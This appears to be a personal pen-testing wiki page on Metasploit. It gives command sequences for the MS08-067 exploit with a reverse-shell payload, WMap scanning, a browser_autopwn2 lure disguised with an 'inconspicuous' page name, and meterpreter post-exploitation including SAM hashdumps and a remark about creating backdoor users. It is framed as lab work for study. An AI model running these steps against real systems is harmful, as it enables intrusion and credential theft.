---
layout: page
title: "Metasploit"
permalink: /Exploitation/Metasploit/
nav_order: 2
parent: Exploitation
---

Tool that aggregates exploits and allows pen testers to easily try multple exploits against a target or group of targets.

## Terms

* Exploit: Module that uses a payload. Auxillary module has no payload
* Payload: Code that runs remotely. Can use encoder and nops to hide code from AB
* Modules: /usr/share/metasploit-framework/modules/ . Written in Ruby

## Setup

From Kali:

`apt update`
`service postgresql start`
`msfdb init`

## Workspaces

    workspace -a <newname>
    workspace -d <deletename>
    workspace name
    workspace -h

## Basic Usage

    show exploits
    show auxiliary
    show options
    show targets

## MS08-067

    search ms08_067_netapi
    Use exploit/windows/smb/ms08_067_netapi
    Set payload windows/meterpreter/reverse_tcp
    Show targets
    Set target 2
    Set RHOST [target machine ip]
    Set LHOST [Kali machine ip]
    Set LPORT [port]
    Show options
    Exploit
    shell

## WMap

    use wmap
Loads the msfcrawler/wmap module

    info
Shows options available to set for this module

    set RHOSTS 192.168.8.133
Sets the target host ip. Could be ip, ip range

    run
Runs the vulnerability scan against the RHOSTS ip or ip range

    vulns
Shows discovered vulnerabilities

Alternatively, you could run wmap commands directly using the wmap plugin. This allows us to target a specific set of URLs instead.

    load wmap
Loads the wmap plugin

    wmap_sites -a http://192.168.8.133 (Links to an external site.)
Adds a target host root

    wmap_sites -l
Shows host root list

    wmap_targets -t http://192.168.8.133/vicnum/ (Links to an external site.)
Adds target web apps to job scope list

    wmap_run -t
Shows active modules

    wmap_run -e
Runs the active modules against the targets list

    vulns
Shows discovered vulnerabilities

## AutoPwn2

    use auxiliary/server/browser_autopwn2
    show options

![Autopwn](/media/autopwn2_1.png)

This loads the plugin and shows us what we can set for the plugin.

    Set the URIPATH and SRVPORT to something inconspicuous
    set URIPATH Home
    set SRVPORT 80

![Autopwn](/media/autopwn2_2.png)

The URIPATH will be the page name in the URL. The word Home isn’t as suspect as the random default. SRVPORT just defines the port which the web server will bind to.

To show available commands. Take note of the auxiliary commands.

    ?

![Autopwn](/media/autopwn2_3.png)

Run the plugin module with common exploit modules

    run

![Autopwn](/media/autopwn2_4.png)

This may take a couple minutes. Take note of the BrowserAutoPwn URL at the bottom. This is the URL our targets need to browse to.

On the target VM, open internet explorer and go to the BrowserAutoPwn URL

![Autopwn](/media/autopwn2_5.png)

One the attacker vm, you’ll notice Metasploit attempting exploits against the browser and a meterpreter session will be created.

![Autopwn](/media/autopwn2_6.png)

## Meterpreter

To see the active session list

    sessions -l

To enter an interactive session

    sessions -i <session id>

![](/media/meterpreter_1.png)

You can run ``?`` to get a listing of available commands at this meterpreter shell
There are many commands available, but not all will work for every target.
A few examples:
You can grab a screenshot of the active user session

    screenshot

![](/media/meterpreter_2.png)

Pull a hashdump of the SAM database

    hashdump

![](/media/meterpreter_3.png)

Make a registry change

    reg [command] [options]

![](/media/meterpreter_4.png)

This creates a new Reg key named ‘Test’ at HKLM\Software\

Open an interactive command prompt

    shell

![](/media/meterpreter_5.png)

In this screenshot, I was able to show the hostname of the target and enumerate local users from a remote interactive command prompt. You could of course create a backdoor user from here if you chose.

Exit meterpreter and Metasploit to clean up jobs and stop web servers

![](/media/meterpreter_6.png)

## References

[Rapid7 MSFCrawler](https://www.rapid7.com/db/modules/auxiliary/crawler/msfcrawler)

[Offensive Security WMap](https://www.offensive-security.com/metasploit-unleashed/wmap-web-scanner/)

[Null Byte WMap](https://null-byte.wonderhowto.com/how-to/use-metasploits-wmap-module-scan-web-applications-for-common-vulnerabilities-0187572/)

[Offensive Security Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)

[Infosec Institute Vulnerability Scanning with Metasploit](https://resources.infosecinstitute.com/vulnerability-scanning-metasploit-part-ii/#gref)

[About the Metasploit Meterpreter](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/)
